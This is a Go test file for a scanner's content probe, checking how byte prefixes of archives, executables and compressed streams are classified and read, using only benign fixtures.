// ProbeContent is tested above with real bytes.
func TestProbeAppliesTruthTable(t *testing.T) {
	const (
		archiveName = "pkg-1.0.tgz"
		indexName   = "index.json"
	)
	for _, tc := range []struct {
		name         string
		probe        Probe
		class        Class
		indexArchive bool
		filename     string
		want         bool
	}{
		// Nothing recognizable.
		{"nothing, payload", Probe{}, ClassPayload, false, "", true},
		{"nothing, metadata", Probe{}, ClassMetadata, false, archiveName, false},
		{"nothing, metadata expected to be an archive", Probe{}, ClassMetadata, true, archiveName, false},
		{"nothing, unclassified, named like an index", Probe{}, ClassUnknown, false, indexName, false},
		{"nothing, unclassified, unnamed", Probe{}, ClassUnknown, false, "", false},
		{"nothing, unclassified, named like a package", Probe{}, ClassUnknown, false, archiveName, true},

		// A tar or cpio.
		{"tar, metadata", Probe{Container: true, TarLike: true}, ClassMetadata, false, indexName, true},
		{"tar, metadata expected to be an archive", Probe{Container: true, TarLike: true}, ClassMetadata, true, indexName, false},
		{"tar.gz, metadata expected to be an archive", Probe{Compressed: true, Container: true, TarLike: true}, ClassMetadata, true, indexName, false},
		{"tar, unclassified", Probe{Container: true, TarLike: true}, ClassUnknown, false, indexName, true},
		{"tar, unclassified (indexArchive is about metadata only)", Probe{Container: true, TarLike: true}, ClassUnknown, true, indexName, true},
		{"tar, payload (indexArchive is about metadata only)", Probe{Container: true, TarLike: true}, ClassPayload, true, indexName, true},

		// Any other container.
		{"zip, metadata", Probe{Container: true}, ClassMetadata, false, indexName, true},
		{"zip, metadata expected to be an archive", Probe{Container: true}, ClassMetadata, true, indexName, true},
		{"zip.gz, metadata expected to be an archive", Probe{Compressed: true, Container: true}, ClassMetadata, true, indexName, true},
		{"zip, unclassified", Probe{Container: true}, ClassUnknown, false, "", true},

		// Something that runs.
		{"executable, metadata", Probe{Executable: true}, ClassMetadata, false, indexName, true},
		{"executable, metadata expected to be an archive", Probe{Executable: true}, ClassMetadata, true, indexName, true},
		{"compressed executable, metadata", Probe{Compressed: true, Executable: true}, ClassMetadata, false, indexName, true},
		{"executable, unclassified", Probe{Executable: true}, ClassUnknown, false, "", true},

		// A format the scanner cannot open: counts for an unclassified resource,
		// which is then reported as a package that went unexamined.
		{"unsupported, unclassified", Probe{Unsupported: true}, ClassUnknown, false, "", true},
		{"unsupported inside compression, unclassified", Probe{Compressed: true, Unsupported: true}, ClassUnknown, false, indexName, true},
		{"unsupported, metadata", Probe{Unsupported: true}, ClassMetadata, false, "Packages.lz4", false},
		{"unsupported, payload", Probe{Unsupported: true}, ClassPayload, false, "", true},

		// Compressed text or data.
		{"compressed data, metadata", Probe{Compressed: true}, ClassMetadata, false, "Packages.gz", false},
		{"compressed data, unclassified, unnamed", Probe{Compressed: true}, ClassUnknown, false, "", false},
		{"compressed data, unclassified, named like an index", Probe{Compressed: true}, ClassUnknown, false, "Packages.gz", false},
		{"compressed data, payload", Probe{Compressed: true}, ClassPayload, false, "Packages.gz", true},
	} {
		if got := tc.probe.Applies(tc.class, tc.indexArchive, tc.filename); got != tc.want {
			t.Errorf("%s: %+v.Applies(%s, %v, %q) = %v, want %v", tc.name, tc.probe, tc.class, tc.indexArchive, tc.filename, got, tc.want)
		}
	}
}

// Applicable is ProbeContent followed by Applies — the cached path remembers
// the probe and applies it per request, the direct path asks in one call, and
// the two must agree.
func TestApplicableIsProbeContentThenApplies(t *testing.T) {
	for _, s := range aplCorpus(t) {
		prefix := aplPrefix(t, s.data)
		p := ProbeContent(prefix)
		for _, class := range []Class{ClassUnknown, ClassMetadata, ClassPayload} {
			for _, indexArchive := range []bool{false, true} {
				for _, name := range []string{"index.json", "pkg-1.0.tgz"} {
					if got, want := Applicable(class, indexArchive, prefix, name), p.Applies(class, indexArchive, name); got != want {
						t.Errorf("%s as %s (indexArchive=%v, %q): Applicable = %v, ProbeContent(...).Applies = %v", s.name, class, indexArchive, name, got, want)
					}
				}
			}
		}
	}
}

// Probing is a function of the bytes alone and does not disturb them.
func TestProbeContentIsDeterministicAndLeavesThePrefixAlone(t *testing.T) {
	for _, s := range aplCorpus(t) {
		prefix := aplPrefix(t, s.data)
		before := append([]byte(nil), prefix...)
		first := ProbeContent(prefix)
		second := ProbeContent(prefix)
		if first != second {
			t.Errorf("%s: two probes of the same bytes differ: %+v, %+v", s.name, first, second)
		}
		if !bytes.Equal(prefix, before) {
			t.Errorf("%s: ProbeContent modified the prefix it was given", s.name)
		}
	}
}

func TestTarLike(t *testing.T) {
	tarball := aplTar(t, "pkg/a.txt", "a\n")
	for _, tc := range []struct {
		name string
		head []byte
		want bool
	}{
		{"tar block", tarball[:512], true},
		{"cpio newc", aplFixture(t, "hello-newc.cpio"), true},
		{"cpio crc", aplFixture(t, "hello-crc.cpio"), true},
		{"cpio odc", aplFixture(t, "hello-odc.cpio"), true},
		{"zip", aplZip(t, "a.txt", "a\n"), false},
		{"empty zip", []byte("PK\x05\x06" + strings.Repeat("\x00", 18)), false},
		{"spanned zip", []byte("PK\x07\x08PK\x03\x04"), false},
		{"ar", aplFixture(t, "plain.a"), false},
		{"deb", aplDeb(), false},
		{"rpm", aplFixture(t, "pthello-none.rpm"), false},
		{"nar", aplFixture(t, "hello.nar"), false},
		{"text", []byte(aplPackagesIndex), false},
		{"ELF", []byte("\x7fELF\x02\x01\x01\x00"), false},
		{"a tar block cut short", tarball[:511], false},
		{"empty", nil, false},
	} {
		head := tc.head
		if len(head) > SniffBytes {
			head = head[:SniffBytes]
		}
		if got := tarLike(head); got != tc.want {
			t.Errorf("tarLike(%s) = %v, want %v", tc.name, got, tc.want)
		}
	}
}

// aplCountingReader counts what is read through it, and how often it was asked
// again after reporting the end.
type aplCountingReader struct {
	r io.Reader
	n int
}

func (c *aplCountingReader) Read(p []byte) (int, error) {
	n, err := c.r.Read(p)
	c.n += n
	return n, err
}

// aplRandom returns n reproducible bytes that no compressor shrinks.
func aplRandom(n int, seed int64) []byte {
	b := make([]byte, n)
	rand.New(rand.NewSource(seed)).Read(b)
	return b
}

// Content shorter than one block is returned whole, compressed or not, and its
// end is not an error.
func TestReadProbePrefixReturnsShortContentWhole(t *testing.T) {
	for _, tc := range []struct {
		name string
		data []byte
	}{
		{"empty", nil},
		{"one byte", []byte{0x1f}},
		{"short json", []byte(`{"name":"demo"}`)},
		{"short gzip", aplGzip(t, []byte(aplPackagesIndex))},
		{"short zstd", aplZstd(t, []byte(aplPackagesIndex))},
		{"gzip magic alone", []byte{0x1f, 0x8b}},
		{"one byte less than a block", aplNoise(SniffBytes - 1)},
		{"exactly one block", aplNoise(SniffBytes)},
		{"exactly one block of gzip", aplGzip(t, aplRandom(2048, 1))[:SniffBytes]},
	} {
		for _, wrap := range []struct {
			name string
			fn   func(io.Reader) io.Reader
		}{
			{"plain reader", func(r io.Reader) io.Reader { return r }},
			{"one byte at a time", iotest.OneByteReader},
			{"data and EOF together", iotest.DataErrReader},
		} {
			got, err := ReadProbePrefix(wrap.fn(bytes.NewReader(tc.data)))
			if err != nil {
				t.Errorf("%s (%s): err = %v, want none", tc.name, wrap.name, err)
				continue
			}
			if !bytes.Equal(got, tc.data) {
				t.Errorf("%s (%s): got %d bytes, want the whole content (%d bytes)", tc.name, wrap.name, len(got), len(tc.data))
			}
		}
	}
}

// Content that is not compressed is told from its first block: exactly
// SniffBytes are returned and not one byte more is taken from the reader — the
// direct path serves the rest of the response from that very reader.
func TestReadProbePrefixReadsOneBlockOfUncompressedContent(t *testing.T) {
	tarball := aplTar(t, "pkg/big.bin", string(aplRandom(8<<10, 2)))
	for _, tc := range []struct {
		name string
		data []byte
	}{
		{"tar", tarball},
		{"zip", aplZip(t, "pkg/big.bin", string(aplRandom(8<<10, 3)))},
		{"json", bytes.Repeat([]byte(`{"name":"demo"},`), 400)},
		{"ELF", append([]byte("\x7fELF\x02\x01\x01\x00"), aplRandom(8<<10, 4)...)},
		{"7-zip (a signature the scanner does not open is not looked through)", append([]byte("7z\xbc\xaf\x27\x1c"), aplRandom(8<<10, 5)...)},
		{"noise", aplNoise(8 << 10)},
		{"one byte more than a block", aplNoise(SniffBytes + 1)},
	} {
		cr := &aplCountingReader{r: bytes.NewReader(tc.data)}
		got, err := ReadProbePrefix(cr)
		if err != nil {
			t.Errorf("%s: err = %v", tc.name, err)
			continue
		}
		if len(got) != SniffBytes || !bytes.Equal(got, tc.data[:SniffBytes]) {
			t.Errorf("%s: got %d bytes, want exactly the first %d", tc.name, len(got), SniffBytes)
		}
		if cr.n != SniffBytes {
			t.Errorf("%s: %d bytes were read from the reader, want exactly %d", tc.name, cr.n, SniffBytes)
		}
	}
}

// Compressed content has to be looked through, so it is read on — up to
// ProbeBytes and never past it.
func TestReadProbePrefixReadsCompressedContentUpToProbeBytes(t *testing.T) {
	// Incompressible content: its gzip, zstd and tar.gz forms are all longer than
	// the probe.
	big := aplRandom(ProbeBytes+ProbeBytes/4, 6)
	bigGzip := aplGzip(t, big)
	for _, tc := range []struct {
		name string
		data []byte
	}{
		{"gzip longer than the probe", bigGzip},
		{"zstd longer than the probe", aplZstd(t, big)},
		{"tar.gz longer than the probe", aplGzip(t, aplTar(t, "pkg/big.bin", string(big)))},
		{"a stream that emits nothing within the probe", aplZeroOutputGzip()},
		{"exactly the probe", bigGzip[:ProbeBytes]},
		{"one byte more than the probe", bigGzip[:ProbeBytes+1]},
	} {
		if len(tc.data) < ProbeBytes {
			t.Fatalf("%s: the sample is only %d bytes", tc.name, len(tc.data))
		}
		cr := &aplCountingReader{r: bytes.NewReader(tc.data)}
		got, err := ReadProbePrefix(cr)
		if err != nil {
			t.Errorf("%s: err = %v", tc.name, err)
			continue
		}
		if len(got) != ProbeBytes || !bytes.Equal(got, tc.data[:ProbeBytes]) {
			t.Errorf("%s: got %d bytes, want exactly the first %d", tc.name, len(got), ProbeBytes)
		}
		if cr.n != ProbeBytes {
			t.Errorf("%s: %d bytes were read from the reader, want exactly %d", tc.name, cr.n, ProbeBytes)
		}
	}

	// Compressed content longer than a block and shorter than the probe is
	// returned whole.
	for _, tc := range []struct {
		name string
		data []byte
	}{
		{"gzip of a few blocks", aplGzip(t, aplRandom(4096, 7))},
		{"zstd of a few blocks", aplZstd(t, aplRandom(4096, 8))},
		{"deb.gz", aplGzip(t, aplFixture(t, "pthello-none.deb"))},
	} {
		if len(tc.data) <= SniffBytes || len(tc.data) >= ProbeBytes {
			t.Fatalf("%s: the sample is %d bytes, want between a block and the probe", tc.name, len(tc.data))
		}
		for _, wrap := range []func(io.Reader) io.Reader{
			func(r io.Reader) io.Reader { return r },
			iotest.OneByteReader,
			iotest.HalfReader,
		} {
			got, err := ReadProbePrefix(wrap(bytes.NewReader(tc.data)))
			if err != nil || !bytes.Equal(got, tc.data) {
				t.Errorf("%s: got %d bytes, err %v; want the whole content (%d bytes)", tc.name, len(got), err, len(tc.data))
			}
		}
	}
}

// A reader that fails is reported: the caller must not decide from a prefix it
// did not get. Only the end of the content is not a failure.
func TestReadProbePrefixReturnsReaderErrors(t *testing.T) {
	boom := errors.New("upstream reset the connection")
	gzLong := aplGzip(t, aplRandom(8192, 9))
	for _, tc := range []struct {
		name string
		r    io.Reader
		want error
	}{
		{"fails at once", iotest.ErrReader(boom), boom},
		{"fails inside the first block", io.MultiReader(bytes.NewReader(aplNoise(100)), iotest.ErrReader(boom)), boom},
		{"fails inside the first block of compressed content", io.MultiReader(bytes.NewReader(gzLong[:100]), iotest.ErrReader(boom)), boom},
		{"fails after the first block of compressed content", io.MultiReader(bytes.NewReader(gzLong[:SniffBytes]), iotest.ErrReader(boom)), boom},
		{"fails deep into compressed content", io.MultiReader(bytes.NewReader(gzLong[:4000]), iotest.ErrReader(boom)), boom},
		// TimeoutReader fails its second read: the first block arrives, the rest
		// does not.
		{"times out after the first block of compressed content", iotest.TimeoutReader(bytes.NewReader(gzLong)), iotest.ErrTimeout},
	} {
		got, err := ReadProbePrefix(tc.r)
		if !errors.Is(err, tc.want) {
			t.Errorf("%s: err = %v (prefix of %d bytes), want the reader's own error %v", tc.name, err, len(got), tc.want)
		}
		if got != nil {
			t.Errorf("%s: a prefix (%d bytes) was returned along with the error", tc.name, len(got))
		}
	}

	// A failure that comes after everything the probe needs is none of its
	// business: an uncompressed resource is decided on its first block.
	got, err := ReadProbePrefix(io.MultiReader(bytes.NewReader(aplNoise(SniffBytes)), iotest.ErrReader(boom)))
	if err != nil || len(got) != SniffBytes {
		t.Errorf("an error past the first block of uncompressed content: got %d bytes, err %v", len(got), err)
	}
}

// NeedsLongProbe is the question "is this compressed?": true for anything that
// has to be looked through — including a stream too short or too broken to
// decode — false for everything that is told from its first block.
func TestNeedsLongProbe(t *testing.T) {
	tarball := aplTar(t, "pkg/a.txt", "a\n")
	gzText := aplGzip(t, []byte(aplPackagesIndex))
	for _, tc := range []struct {
		name string
		head []byte
		want bool
	}{
		{"gzip text", gzText, true},
		{"tar.gz", aplGzip(t, tarball), true},
		{"zstd text", aplZstd(t, []byte(aplPackagesIndex)), true},
		{"zstd skippable frame", []byte{0x50, 0x2a, 0x4d, 0x18, 0x04, 0x00, 0x00, 0x00, 1, 2, 3, 4}, true},
		{"xz text", aplHex(t, aplPackagesXZ), true},
		{"bzip2 text", aplHex(t, aplPackagesBzip2), true},
		{"hello.tar.xz", aplFixture(t, "hello.tar.xz"), true},
		{"hello.tar.zst", aplFixture(t, "hello.tar.zst"), true},
		{"hello.tar.bz2", aplFixture(t, "hello.tar.bz2"), true},
		{"hello.tar.lzma", aplFixture(t, "hello.tar.lzma"), true},
		{"install.sh.gz", aplFixture(t, "install.sh.gz"), true},
		{"the first block of a long gzip stream", aplGzip(t, aplRandom(8192, 10))[:SniffBytes], true},
		{"the first block of a long zstd stream", aplZstd(t, aplRandom(8192, 11))[:SniffBytes], true},
		{"gzip cut short", gzText[:len(gzText)/2], true},
		{"gzip magic alone", []byte{0x1f, 0x8b}, true},
		{"gzip magic then junk", append([]byte{0x1f, 0x8b, 0x08, 0x00}, bytes.Repeat([]byte{0x55}, 64)...), true},
		{"xz magic then junk", append([]byte{0xfd, '7', 'z', 'X', 'Z', 0x00}, bytes.Repeat([]byte{0x01}, 64)...), true},

		{"empty", nil, false},
		{"json", []byte(`{"name":"demo"}`), false},
		{"html", []byte("<html></html>"), false},
		{"text", []byte(aplPackagesIndex), false},
		{"noise", aplNoise(SniffBytes), false},
		{"tar", tarball[:SniffBytes], false},
		{"zip", aplZip(t, "a.txt", "a\n"), false},
		{"deb", aplDeb(), false},
		{"rpm", aplFixture(t, "pthello-none.rpm")[:SniffBytes], false},
		{"cpio", aplFixture(t, "hello-newc.cpio")[:SniffBytes], false},
		{"nar", aplFixture(t, "hello.nar")[:SniffBytes], false},
		{"ELF", []byte("\x7fELF\x02\x01\x01\x00"), false},
		{"shell script", []byte("#!/bin/sh\n"), false},
		{"pickle", []byte("\x80\x04\x95\x05\x00\x00\x00\x00\x00\x00\x00K\x01."), false},
		// Formats the scanner does not open are not looked through either.
		{"7-zip", []byte("7z\xbc\xaf\x27\x1c\x00\x04"), false},
		{"lz4 frame", []byte{0x04, 0x22, 0x4d, 0x18, 0x64, 0x40, 0xa7}, false},
		{"bzip2 with an invalid level", []byte("BZh0\x31\x41\x59\x26"), false},
	} {
		if got := NeedsLongProbe(tc.head); got != tc.want {
			t.Errorf("NeedsLongProbe(%s) = %v, want %v", tc.name, got, tc.want)
		}
	}
}

// The first block of a compressed stream may not be enough to see through it.
// The short answer is then "cannot tell" — examined — and reading on, as
// ReadProbePrefix does, gives the real one. Either way a package is not missed,
// and an index is not held up once its content is in view.
func TestLongProbeSeesWhatTheFirstBlockDoesNot(t *testing.T) {
	// A gzip header carrying an extra field longer than a block: none of the
	// deflate stream is within the first SniffBytes.
	withLongHeader := func(content []byte) []byte {
		var buf bytes.Buffer
		gw := gzip.NewWriter(&buf)
		gw.Extra = make([]byte, 600)
		if _, err := gw.Write(content); err != nil {
			t.Fatal(err)
		}
		if err := gw.Close(); err != nil {
			t.Fatal(err)
		}
		return buf.Bytes()
	}
	tarball := aplTar(t, "evil-1.0/setup.py", "import os\n")
	for _, tc := range []struct {
		name string
		data []byte
		// wantMetadata is whether the full probe finds something to examine in a
		// resource served as metadata.
		wantMetadata bool
		wantProbe    Probe
	}{
		{"tar behind a long gzip header", withLongHeader(tarball), true, Probe{Compressed: true, Container: true, TarLike: true}},
		{"text behind a long gzip header", withLongHeader([]byte(aplPackagesIndex)), false, Probe{Compressed: true}},
	} {
		if len(tc.data) <= SniffBytes {
			t.Fatalf("%s: the sample is only %d bytes", tc.name, len(tc.data))
		}
		head := tc.data[:SniffBytes]
		if !NeedsLongProbe(head) {
			t.Errorf("%s: the first block does not ask for a long probe", tc.name)
		}
		if short := ProbeContent(head); !short.Undetermined {
			t.Errorf("%s: the first block alone probed as %+v, want Undetermined", tc.name, short)
		}
		if !Applicable(ClassMetadata, true, head, "index.json") {
			t.Errorf("%s: judged from its first block alone, it was waved through", tc.name)
		}

		full := ProbeContent(aplPrefix(t, tc.data))
		full.Unsupported = false // says nothing here; see TestProbeContentTellsWhatTheBytesAre
		if full != tc.wantProbe {
			t.Errorf("%s: full probe = %+v, want %+v", tc.name, full, tc.wantProbe)
		}
		if got := Applicable(ClassMetadata, false, aplPrefix(t, tc.data), "index.json"); got != tc.wantMetadata {
			t.Errorf("%s: served as metadata, Applicable = %v, want %v", tc.name, got, tc.wantMetadata)
		}
	}
}

// What is inside a compression layer is all that counts: the layer itself, its
// kind and its depth (up to the depth the walker follows) change nothing.
func TestCompressionIsLookedThroughNotAt(t *testing.T) {
	tarball := aplTar(t, "pkg/a.txt", "a\n")
	zipped := aplZip(t, "pkg/a.txt", "a\n")
	text := []byte(aplPackagesIndex)
	elf := []byte("\x7fELF\x02\x01\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x03\x00\x3e\x00")

	layers := map[string]func([]byte) []byte{
		"gzip":      func(b []byte) []byte { return aplGzip(t, b) },
		"zstd":      func(b []byte) []byte { return aplZstd(t, b) },
		"gzip+zstd": func(b []byte) []byte { return aplZstd(t, aplGzip(t, b)) },
		"zstd+gzip": func(b []byte) []byte { return aplGzip(t, aplZstd(t, b)) },
	}
	for layer, wrap := range layers {
		for _, tc := range []struct {
			name    string
			content []byte
		}{
			{"tar", tarball}, {"zip", zipped}, {"text", text}, {"ELF", elf},
		} {
			bare := ProbeContent(aplPrefix(t, tc.content))
			wrapped := ProbeContent(aplPrefix(t, wrap(tc.content)))
			if !wrapped.Compressed {
				t.Errorf("%s under %s: not reported as compressed: %+v", tc.name, layer, wrapped)
			}
			wrapped.Compressed = false
			if wrapped != bare {
				t.Errorf("%s under %s probes as %+v, bare as %+v", tc.name, layer, wrapped, bare)
			}
		}
	}
}
